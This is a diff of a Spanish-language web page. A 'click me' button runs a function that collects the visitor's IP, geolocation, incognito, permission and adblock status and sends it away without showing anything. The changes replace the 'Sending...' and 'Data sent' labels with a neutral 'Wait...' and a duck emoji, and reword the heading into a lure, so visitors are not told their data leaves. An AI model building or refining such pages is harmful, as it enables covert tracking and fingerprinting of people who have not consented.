@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <title>PAGE</title>
+  <title>Test</title>
   <style>
     body { font-family: Arial; padding: 20px; background: #f0f0f0; }
     .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 700px; margin: auto; }
@@ -11,7 +11,7 @@
 </head>
 <body>
   <div class="box">
-    <h2>Aprieta el botón Porfavor</h2>
+    <h2>Aprieta el boton pada ver algo</h2>
     <button id="startBtn">Dame Click</button>
     <!-- pre eliminado, no mostramos resultados -->
   </div>
@@ -130,7 +130,7 @@
   async function collectAndSend() {
     // No mostramos nada en pantalla
     startBtn.disabled = true;
-    startBtn.textContent = "Enviando...";
+    startBtn.textContent = "Espera...";
 
     const [ipRes, geoRes, incognitoStatus, permStatus, adblockStatus] = await Promise.allSettled([
       getIPInfo(),
@@ -191,7 +191,7 @@ Hora: ${new Date().toLocaleString()}
     }
     
     // Opcional: cambiar texto del botón al finalizar
-    startBtn.textContent = "Datos enviados";
+    startBtn.textContent = "🦆(Espera un 5 segundos)";
   }
 
   startBtn.onclick = collectAndSend;
